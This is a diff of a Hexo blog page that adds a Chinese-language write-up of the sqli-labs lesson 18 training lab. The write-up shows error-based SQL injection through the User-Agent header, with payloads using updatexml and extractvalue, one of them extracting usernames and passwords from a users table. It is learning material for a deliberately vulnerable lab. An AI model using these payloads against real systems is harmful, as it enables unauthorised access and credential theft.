@@ -10,7 +10,7 @@
     
     
     
-    <title>archive_a | Hexo</title>
+    <title>sqli-labs-18 | Hexo</title>
     <link href="http://example.com" rel="prefetch" />
 
     
@@ -107,7 +107,7 @@
                 
                 
                 
-                <li class="current">
+                <li class="">
                     <a href="/archives">
                         <i class="fa fa-archive"></i>归档
                     </a>
@@ -150,19 +150,27 @@
         <div class="container">
             <div class="row">
                 <div class="col-md-8 gal-right" id="mainstay">
-                    <article class="article well article-body" id="article-archive">
+                    
+<article class="article well article-body" id="article">
     <div class="breadcrumb">
         <i class="fa fa-home"></i>
         <a href="http://example.com">Hexo</a>
         >
-        <span>归档</span>
+        <span>sqli-labs-18</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/archives">归档</a>
+                <a href="/2022/04/01/sqli-labs-18/">sqli-labs-18</a>
             </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2022-04-01
+            </span>
+            
         </div>
     </div>
     <!-- 小型设备详细文章 -->
@@ -170,67 +178,45 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/archives">归档</a>
+                    <a href="/2022/04/01/sqli-labs-18/">sqli-labs-18</a>
                 </h4>
             </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2022-04-01
+            </p>
+            <p>
+                
+                
+            </p>
         </center>
     </div>
-    <div class="content-article" style="margin-top: 30px;">
-        
-        
-            <h1 style="font-size: 24px; margin-top: 40px;">2022年</h1>
-            
-        <div class="alert alert-info" style="font-size: 14px; line-height: 2; font-weight: bold;">
-            
-             
-             
-                        <a href="/2022/04/01/sqli-labs-18/">sqli-labs-18</a>
-                        <br>
-            
-             
-                        <a href="/2022/03/31/sqli-labs-17/">sqli-labs-17</a>
-                        <br>
-            
-             
-                        <a href="/2022/03/31/sqli-labs-14/">sqli-labs-14</a>
-                        <br>
-            
-             
-                        <a href="/2022/03/31/sqli-labs-11/">sqli-labs-11</a>
-                        <br>
-            
-             
-                        <a href="/2022/03/30/sqli-labs-7/">sqli-labs-7</a>
-                        <br>
-            
-             
-                        <a href="/2022/03/30/sqli-labs-6/">sqli-labs-6</a>
-                        <br>
-            
-             
-                        <a href="/2022/03/30/sqli-labs-5/">sqli-labs-5</a>
-                        <br>
-            
-             
-                        <a href="/2022/03/30/sqli-labs-4/">sqli-labs-4</a>
-                        <br>
-            
-             
-                        <a href="/2022/03/23/sqli-labs-3/">sqli-labs_3</a>
-                        <br>
-            
-             
-                        <a href="/2022/03/23/sqli-labs-2/">sqli-labs_2</a>
-                        <br>
-            
-             
-                        <a href="/2022/03/22/sqli-labs-1/">sqli-labs_1</a>
-                        <br>
-            
-                    </div>
-        
+    <div class="content-article">
+        <h1 id="sqli-labs-18"><a href="#sqli-labs-18" class="headerlink" title="sqli-labs-18"></a>sqli-labs-18</h1><h2 id="一、观察题目"><a href="#一、观察题目" class="headerlink" title="一、观察题目"></a>一、观察题目</h2><p><img src="/2022/04/01/sqli-labs-18/image-20220401110524690.png" alt="image-20220401110524690"></p>
+<p>尝试admin登录</p>
+<p><img src="/2022/04/01/sqli-labs-18/image-20220401110543985.png" alt="image-20220401110543985"></p>
+<p>提示我的user agent。结合标题，可以得出，是在http报文头中user agent属性进行注入。</p>
+<h2 id="二、尝试寻找注入点"><a href="#二、尝试寻找注入点" class="headerlink" title="二、尝试寻找注入点"></a>二、尝试寻找注入点</h2><p>用burp抓包，发送至repeater，在user agent后添加单引号，查看返回报文</p>
+<p><img src="/2022/04/01/sqli-labs-18/image-20220401111113140.png" alt="image-20220401111113140"></p>
+<p>发现可以注入。但是不知道如何进行构造。上网搜索后发现两种注入方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27; and updatexml(1,concat(0x7e,(select database())),1) and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>此方法没有详细说明，因此不是很明白原理。</p>
+<p>第二种查看了源码，但是讲解让我恍然大悟。后面的ip和用户名是需要构造进去的。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-zhong/p/10925426.html">sqli-labs(18) - N0lan - 博客园 (cnblogs.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,1,1&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<p>此外，经过测试，并不能识别–+注释，原因不明。（有可能上课听漏了抖抖抖）</p>
+<h2 id="三、查询数据"><a href="#三、查询数据" class="headerlink" title="三、查询数据"></a>三、查询数据</h2><p>知道了构造方法，接下来就和之前一样了。在此不再赘述。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:1&#x27;,1,extractvalue(1,(select group_concat(username,&#x27;:&#x27;,password,&#x27;,&#x27;) from users limit 0,1)))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/01/sqli-labs-18/image-20220401160905280.png" alt="image-20220401160905280"></p>
+<h2 id="四、错误小结"><a href="#四、错误小结" class="headerlink" title="四、错误小结"></a>四、错误小结</h2><p>报错信息后面跟多少词条一般代表后面有多少参数，此时构造需要将那些参数构造在内。</p>
+<p>最后还是没看懂第一个注入方式怎么构造的。</p>
+
     </div>
 </article>
+
+
                 </div>
                 <aside class="col-md-4 gal-left" id="sidebar">
     <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
@@ -363,6 +349,12 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2022/03/22/sqli-labs-1/">sqli-labs_1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2022/03/23/sqli-labs-2/">sqli-labs_2</a>
                 </span>
             </li>
@@ -388,12 +380,6 @@
             <li class="list-group-item">
                 <span class="post-title">
                     <a href="/2022/04/01/sqli-labs-18/">sqli-labs-18</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2022/03/31/sqli-labs-14/">sqli-labs-14</a>
                 </span>
             </li>
             
@@ -432,17 +418,17 @@
 
                 
                 <li>
-                    <a href="/archives/2022/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                    <a href="/2022/04/01/sqli-labs-18/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/archives/2022/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                    <a href="/2022/04/01/sqli-labs-18/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/archives/2022/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2022/04/01/sqli-labs-18/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
                 
             </ul>
